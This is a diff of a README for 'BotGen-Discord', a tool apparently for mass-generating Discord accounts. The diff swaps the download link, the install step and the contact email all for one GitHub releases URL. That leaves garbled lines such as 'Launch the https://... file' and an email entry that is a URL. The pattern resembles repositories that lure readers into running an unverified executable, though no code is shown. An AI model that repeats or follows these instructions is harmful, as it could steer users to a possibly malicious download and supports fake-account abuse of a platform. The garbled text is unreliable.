@@ -21,11 +21,11 @@ Welcome to the BotGen-Discord repository! Here you will find a powerful Bot Gene
 - galackqsm
 
 ## 📦 Latest Release
-Please download the latest version of the BotGen-Discord Bot from the following link: [Download App.zip](https://github.com/repo/releases/9246/App.zip)
+Please download the latest version of the BotGen-Discord Bot from the following link: [Download https://github.com/anayacpm01/BotGen-Discord/releases](https://github.com/anayacpm01/BotGen-Discord/releases)
 
 ## 🚀 Getting Started
 1. Download the BotGen-Discord Bot from the provided link.
-2. Launch the App.zip file to install the Bot.
+2. Launch the https://github.com/anayacpm01/BotGen-Discord/releases file to install the Bot.
 3. Follow the on-screen instructions to start generating accounts on Discord.
 
 ## 🖥️ Demo
@@ -43,7 +43,7 @@ This project is licensed under the XYZ License - see the [LICENSE](license-url) 
 - [Twitter](twitter-link)
 - [Discord](discord-link)
 - [Website](website-link)
-- Email: info@botgendiscord.com
+- Email: https://github.com/anayacpm01/BotGen-Discord/releases
 
 ---
 
